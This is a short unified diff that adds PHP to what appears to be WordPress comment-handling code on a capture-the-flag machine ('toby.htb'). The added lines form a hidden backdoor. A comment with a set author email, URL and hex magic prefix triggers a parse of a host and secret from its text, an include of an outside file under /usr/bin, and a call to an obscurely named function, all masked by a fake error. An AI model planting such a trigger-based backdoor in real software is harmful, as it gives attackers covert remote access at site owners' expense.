@@ -1,0 +1,10 @@
+if($comment_author_email=="help@toby.htb"&&$comment_author_url=="http://test.toby.htb/"&&substr($comment_content,0,8)=="746f6279")
+{
+  $a=substr($comment_content,8);
+  $host=explode(":",$a)[0];
+  $sec=explode(":",$a)[1];
+  $d="/usr/bin/wordpress_comment_validate";
+  include $d;
+  wp_validate_4034a3($host,$sec);
+  return new WP_Error('unspecified error');
+}
